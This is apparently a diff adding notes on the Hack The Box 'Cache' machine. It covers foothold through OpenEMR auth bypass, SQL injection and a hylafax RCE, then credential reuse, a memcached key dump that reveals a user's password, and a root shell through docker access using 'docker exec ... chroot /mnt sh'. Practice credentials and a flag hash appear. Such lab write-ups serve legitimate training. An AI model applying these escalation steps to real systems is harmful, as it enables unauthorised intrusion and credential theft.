@@ -1,0 +1,79 @@
+* Cache
+** Enumeration
+** Foothold
+
+~cache.htb~ seems to be not that interesting, but a clue of the author pages suggests looking for another project: ~hms~. Sure enough, adding ~hms.htb~ to ~/etc/hosts~ reveals another VHOST page.
+
+~dirsearch~ reveals a lot of stuff we can directly infiltrate, but none seems immediately useful.
+
+Two example patients:
+hamming:pass
+davis:pass
+Official users:
+phimail-service:NoLogin
+portal-user:NoLogin
+
+Fortunately, 'OpenEMR' seems to be riddled with holes: https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf
+
+The discussed auth-bypass works, as does the SQLI, which allows the dumping of a bunch of tables:
+ * users
+ * globals
+ * users_secure
+
+The latter has a bcrypt-hashed password for ~openemr_admin~, but ~john~ cracks it: ~xxxxxx~
+
+The hylafax RCE attack from ^ works to get a shell as ~www-data~
+
+** Escalation
+
+*** ash
+
+upload ~socat~, upgrade terminal, and ~su ash~ with previously found creds: H@v3_fun
+
+*** luffy
+
+localhost 11211 is running memcached, so there's bound to be something useful stored there
+
+extracting all items from memcached: https://ma.ttias.be/read-keys-values-memcached-instance/
+
+~stats slabs~
+
+stats cachedump 1 0
+ITEM link [21 b; 0 s]
+ITEM user [5 b; 0 s]
+ITEM passwd [9 b; 0 s]
+ITEM file [7 b; 0 s]
+ITEM account [9 b; 0 s]
+
+get user
+VALUE user 0 5
+luffy
+END
+get passwd
+VALUE passwd 0 9
+0n3_p1ec3
+END
+get link
+VALUE link 0 21
+https://hackthebox.eu
+END
+get file
+VALUE file 0 7
+nothing
+END
+get account
+VALUE account 0 9
+afhj556uo
+
+
+*** root
+
+~luffy~ has access to docker!
+
+~docker image inspect~ on the defined image shows a defined command:
+
+running that command provides a root shell:
+
+~docker exec -it 744adf chroot /mnt sh~
+
+ROOT: d941357574c5becbb930738f34e4b945
